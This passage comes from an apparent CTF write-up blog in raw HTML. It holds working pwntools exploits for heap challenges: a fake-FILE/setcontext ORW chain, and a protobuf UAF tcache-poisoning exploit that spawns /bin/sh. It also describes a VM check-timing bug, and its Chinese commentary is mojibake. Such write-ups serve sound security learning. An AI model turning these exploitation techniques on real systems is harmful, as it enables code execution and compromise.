class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Special Data: &#x27;</span>,encode32(protoencode(title,author,isbn,date,price,stock)))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter your choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Keyword: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quitt</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter your choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;6&#x27;</span>)<br><br><br><span class="hljs-comment">#p=remote(&#x27;8.147.131.163&#x27;,13015)</span><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>buy(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-number">12.1</span>,<span class="hljs-number">12</span>)<br>buy(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>see(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;ISBN: &#x27;</span>)<br>heap=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x05&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap&lt;&lt;<span class="hljs-number">12</span>))<br><br>buy(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>buy(<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>buy(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>returnn(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x150</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>see(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x150</span>)<br>libcbase=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x21ace0</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x510</span>),<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># clean</span><br>buy(<span class="hljs-number">20</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>buy(<span class="hljs-number">21</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>buy(<span class="hljs-number">22</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xd0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x150</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x150</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>buy(<span class="hljs-number">23</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x160</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><br>heap=heap&lt;&lt;<span class="hljs-number">12</span><br>gadget=libcbase+<span class="hljs-number">0x167420</span><br>setcontext=libcbase+<span class="hljs-number">0x53A1D</span><br>ret=libcbase+<span class="hljs-number">0x29139</span><br>rdi=<span class="hljs-number">0x2a3e5</span>+libcbase<br>rsi=libcbase+<span class="hljs-number">0x2be51</span><br>rdx_r12=libcbase+<span class="hljs-number">0x11f2e7</span><br>syscall=libcbase+<span class="hljs-number">0x1147e0</span><br>rax=libcbase+<span class="hljs-number">0x45eb0</span><br><br>fake_wide=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(heap+<span class="hljs-number">0x100</span>+<span class="hljs-number">0x22c0</span>)<br>fake_wide=fake_wide.ljust(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_wide+=p64(heap+<span class="hljs-number">0x100</span>+<span class="hljs-number">0x22c0</span>)<br>fake_wide=fake_wide.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_wide+=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x68</span>+p64(gadget)<br>fake_wide=fake_wide.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_wide+=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x20</span>+p64(setcontext)+p64(setcontext)<br>fake_wide=fake_wide.ljust(<span class="hljs-number">0x2a0</span>)+p64(heap+<span class="hljs-number">0x22c0</span>+<span class="hljs-number">0x310</span>)+p64(ret)<br>fake_wide=fake_wide.ljust(<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_wide+=<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)+p64(rdi)+p64(heap+<span class="hljs-number">0x22c0</span>+<span class="hljs-number">0x300</span>)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">2</span>)+p64(syscall)<br>fake_wide+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(heap)+p64(rdx_r12)+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">0</span>)+p64(syscall)<br>fake_wide+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rsi)+p64(heap)+p64(rdx_r12)+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">1</span>)+p64(syscall)+p64(rdi)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">0x3c</span>)+p64(syscall)<br>fake_wide=fake_wide.ljust(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>buy(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,fake_wide,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>stderr=libcbase+<span class="hljs-number">0x21b6a0</span><br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>)+p64(stderr),<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br><br>wfile_jump=libcbase+<span class="hljs-number">0x2170c0</span><br><br>fake_IO=p64((~(<span class="hljs-number">2</span>|<span class="hljs-number">0x8</span>|<span class="hljs-number">0x800</span>))&amp;<span class="hljs-number">0xffffffffffffffff</span>)+p64(heap+<span class="hljs-number">0x200</span>+<span class="hljs-number">0x22c0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">1</span>)<br>fake_IO=fake_IO.ljust(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO+=p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>fake_IO=fake_IO.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO+=p64(heap+<span class="hljs-number">0x22c0</span>)+p64(heap+<span class="hljs-number">0x22c0</span>)+p64(ret)<br>fake_IO=fake_IO.ljust(<span class="hljs-number">0xc0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO+=p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>fake_IO=fake_IO.ljust(<span class="hljs-number">0xd8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO+=p64(wfile_jump)<br><br>edit(<span class="hljs-number">5</span>,fake_IO,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>quitt()<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="ezbuf"><a href="#ezbuf" class="headerlink" title="ezbuf"></a>ezbuf</h1><p><em>ç»å…¸å†ç°ä¹‹protobufå¥—å£³å †</em></p><h2 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><ul><li><p>æœ‰uafæ— editï¼Œaddå›ºå®šå¤§å°0x30ï¼Œåªæœ‰10æ¬¡deleteï¼Œ3æ¬¡æ³„æ¼åå…³é—­stdoutå’Œstderr</p></li><li><p>é«˜ç‰ˆæœ¬double freeæœ‰æ¿å­å¯ä»¥å¥—ï¼Œ<em>æ¯”èµ›çš„æ—¶å€™å®Œå…¨å¿˜è®°äº†æœ‰è¿™ä¸ªæµªè´¹äº†å¾ˆå¤šæ—¶é—´</em></p><ul><li>å¤§æ¦‚å°±æ˜¯åœ¨fastbiné‡Œé€ double freeç„¶åå†æ”¾è¿›tcache</li></ul></li><li><p>ç”±äºåªæœ‰10æ¬¡deleteæ‰€ä»¥åªèƒ½è¿›è¡Œä¸€æ¬¡ä»»æ„å†™ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸€æ¬¡ä»»æ„å†™</p><ul><li>æ”¹ <strong>tcache bin</strong>ï¼Œ<em>è¿™ä¸ªåˆšæƒ³åˆ°äº†</em></li><li>é€šè¿‡ä¸åŒå¤§å°çš„whatconç”³è¯·åˆ°ç›¸åº”å¤§å°çš„chunkï¼Œ<em>è¿™ä¸ªæ²¡æƒ³åˆ°</em></li><li>è¿˜å¯ä»¥é€šè¿‡æŠŠtcache binæ”¾è¿›tcache biné‡Œè¿›è¡Œå¾ªç¯ä½¿ç”¨ï¼Œ<em>å¥—å¥—åˆå¨ƒå¨ƒ</em></li></ul><p>è¿™æ ·å°±èƒ½æŠŠä¸€æ¬¡ä»»æ„å†™å˜å¤šæ¬¡ä»»æ„å†™</p></li><li><p>æœ€åä¸€æ¬¡æ³„æ¼æ ˆåœ°å€å¯ä»¥é€šè¿‡æ”¹stdoutï¼Œå°‘ä¸€æ¬¡æ³„æ¼é¿å…å…³é—­è¾“å‡ºçš„éº»çƒ¦</p></li></ul><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><p><em>é¢˜å¤–è¯ï¼šè™½ç„¶è¿™ä¸ªæ²™ç®±æ²¡ä»€ä¹ˆç”¨ï¼Œä½†å†æ¬¡çœ‹åˆ°è¿™ä¸ªæ²™ç®±å€æ„Ÿäº²åˆ‡ï¼ˆä¸Šæ¬¡åº”è¯¥æ˜¯ACTFï¼‰ï¼Œæ‰€ä»¥è´´ä¸€ä¸‹</em></p><img src="/2024/05/20/2024%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bpwn-wp/sandbox.png" class title="sandbox"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> heybro_pb2<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,con</span>):<br>    bro=heybro_pb2.Heybro()<br>    bro.whatcon=con<br>    bro.whattodo=<span class="hljs-number">1</span><br>    bro.whatidx=idx<br>    p.sendafter(<span class="hljs-string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,bro.SerializeToString())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    bro=heybro_pb2.Heybro()<br>    bro.whattodo=<span class="hljs-number">2</span><br>    bro.whatidx=idx<br>    p.sendafter(<span class="hljs-string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,bro.SerializeToString())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magic</span>(<span class="hljs-params">idx,thiss,size,con</span>):<br>    bro=heybro_pb2.Heybro()<br>    bro.whattodo=<span class="hljs-number">3</span><br>    bro.whatidx=idx<br>    bro.whatthis=thiss<br>    bro.whatsize=size<br>    bro.whatcon=con<br>    p.sendafter(<span class="hljs-string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,bro.SerializeToString())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exitt</span>():<br>    bro=heybro_pb2.Heybro()<br>    bro.whattodo=<span class="hljs-number">4</span><br>    p.sendafter(<span class="hljs-string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,bro.SerializeToString())<br><br><br><span class="hljs-comment">#p=remote(&#x27;8.147.129.121&#x27;,15268)</span><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>magic(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Content:&#x27;</span>)<br>libcbase=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x21ac61</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    delete(i)<br><br>magic(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Content:&#x27;</span>)<br>heap=u64(p.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))+<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">7</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">7</span>,p64(((heap&lt;&lt;<span class="hljs-number">12</span>)-<span class="hljs-number">0x5000</span>+<span class="hljs-number">0xe0</span>)^heap))<br>add(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>+p64(libcbase+<span class="hljs-number">0x21b780</span>-<span class="hljs-number">0x90</span>)+p64(<span class="hljs-number">0</span>)+p64(((heap&lt;&lt;<span class="hljs-number">12</span>)-<span class="hljs-number">0x5000</span>+<span class="hljs-number">0xe0</span>)))<br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x90</span>+p64(<span class="hljs-number">0xfbad1887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(libcbase+<span class="hljs-number">0x222200</span>)+p64(libcbase+<span class="hljs-number">0x222208</span>)<br>add(<span class="hljs-number">7</span>,payload)<br>stack=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>add(<span class="hljs-number">7</span>,p64(<span class="hljs-number">0</span>)+p64(stack-<span class="hljs-number">0x168</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0xd0</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>rdi=libcbase+<span class="hljs-number">0x2a3e5</span><br>bin_sh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>system=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>ret=libcbase+<span class="hljs-number">0x29139</span><br>rop=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)<br>add(<span class="hljs-number">7</span>,rop.ljust(<span class="hljs-number">0xc0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="magic-vm"><a href="#magic-vm" class="headerlink" title="magic_vm"></a>magic_vm</h1><p>æ¯”èµ›çš„æ—¶å€™åŸºæœ¬ä¸Šé€†å®Œäº†ï¼Œä¸€çœ¼æ²¡çœ‹å‡ºæ´+è§£æ•°è¾ƒå°‘æ²¡ç»§ç»­åšï¼Œ<em>æ„Ÿè§‰å½“æ—¶å…¶å®å¯ä»¥åšä¸€ä¸‹çš„</em></p><h2 id="æ€è·¯-2"><a href="#æ€è·¯-2" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p><em>ä¸€ä¸ªå»¶è¿Ÿéå¸¸å¤§çš„vm</em></p><p>ä¸»è¦æ•°æ®ç»“æ„ä½œç”¨</p><ul><li>vm_idï¼šè§£æå®Œçš„codeï¼Œç”Ÿæˆvm_idçš„è¿‡ç¨‹ä¸­ä¼šå¯¹regå’Œaddressè¿›è¡Œæ ¡éªŒ</li><li>vm_aluï¼šæŒ‡ä»¤æ‰§è¡Œ</li><li>vm_memï¼šå†…å­˜ä¿®æ”¹ï¼Œå¦‚stackï¼Œregå’Œmem</li></ul><img src="/2024/05/20/2024%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bpwn-wp/run.png" class title="run"><p>vm::runçš„é€»è¾‘å¦‚ä¸‹</p><ul><li>vm_alu::set_inputï¼šå°†ä¸Šä¸€è½®è§£æå®Œçš„vm_idå¡«å…¥vm_alu</li><li>vm_mem:set_inputï¼šå°†ä¸Šä¸€è½®è®¡ç®—å®Œçš„vm_aluå¡«å…¥vm_mem</li><li>vm_id::runï¼šè§£æè¾“å…¥çš„codeï¼Œè¿›è¡Œä¸€äº›æ£€æŸ¥ï¼Œå¡«å…¥vm_id</li><li>vm_alu::runï¼šå¯¹vm_aluè¿›è¡Œè®¡ç®—</li><li>vm_mem::runï¼šåˆ©ç”¨vm_memè¿›è¡Œå†…å­˜æ›´æ”¹</li></ul><p><em>ä¸ºä»€ä¹ˆè¯´å®ƒå»¶è¿Ÿå¤§å‘¢</em>ï¼Œä¸€è½®vm::runä¸­</p><ul><li><p>vm_aluè®¡ç®—çš„æ˜¯ä¸Šä¸€è½®è§£æçš„vm_id</p></li><li><p>å½“å‰æŒ‡ä»¤å¯¼è‡´çš„å†…å­˜çš„æ›´æ”¹éœ€è¦</p><ul><li>ä¸€æ¬¡vm_mem:set_input</li><li>ä¸€æ¬¡vm_mem::run</li></ul><p>ç”±äºæ£€æŸ¥åœ¨vm_idä¸­ï¼Œæ‰€ä»¥</p><ul><li>æŒ‡ä»¤æ‰§è¡Œå’Œå†…å­˜æ›´æ”¹å»¶è¿Ÿä¸€è½®</li><li>åˆæ³•æ€§æ£€æŸ¥å’Œå†…å­˜æ›´æ”¹å»¶è¿Ÿä¸¤è½®</li></ul></li></ul><p>åœ¨è¿›è¡Œçš„memçš„æ›´æ”¹æ—¶æ£€æŸ¥çš„æ˜¯regçš„å†…å®¹ï¼Œä½†ä¿å­˜çš„æ˜¯regçš„åºå·ï¼Œæ‰€ä»¥ä»¥ä¸‹æ“ä½œï¼š</p><table><thead><tr><th>è½®æ¬¡</th><th>vm_id</th><th>vm_alu</th><th>vm_mem</th></tr></thead><tbody><tr><td>1</td><td>è§£ææ›´æ”¹regä¸ºéæ³•å€¼çš„æŒ‡ä»¤</td><td></td><td></td></tr><tr><td>2</td><td>è§£ænopæŒ‡ä»¤</td><td>æ‰§è¡Œæ›´æ”¹regä¸ºéæ³•å€¼çš„æŒ‡ä»¤</td><td></td></tr><tr><td>3</td><td>è§£æmemæ“ä½œæŒ‡ä»¤ï¼ˆregæ­¤æ—¶ä¸ºåˆæ³•å€¼ï¼Œæ£€æŸ¥é€šè¿‡ï¼‰</td><td>æ‰§è¡ŒnopæŒ‡ä»¤</td><td>regæ›´æ”¹ç”Ÿæ•ˆ</td></tr><tr><td>4</td><td></td><td>æ‰§è¡Œmemæ“ä½œæŒ‡ä»¤</td><td></td></tr><tr><td>5</td><td></td><td></td><td>memæ“ä½œç”Ÿæ•ˆ</td></tr></tbody></table><p>å¯ä»¥åœ¨é€šè¿‡æ£€æŸ¥åæ›´æ”¹regä¸ºéæ³•å€¼</p><h2 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h2><p><em>æ‡’å¾—å†™å‡½æ•°ï¼Œç›´æ¥å¤åˆ¶ç²˜è´´äº†ï¼ŒçœŸä¸‘</em></p><ul><li>åˆ©ç”¨libgcc_sæ³„æ¼libcåŸºå€</li><li>åˆ©ç”¨libgcc_sæ³„æ¼vmçš„memåœ°å€</li><li>_environæ³„æ¼æ ˆåœ°å€</li><li>åˆ©ç”¨æ ˆä¸Šè¿”å›åœ°å€æ³„æ¼pie</li><li>æ›´æ”¹vmçš„memä¸ºstack</li><li>å†™ropé“¾</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span 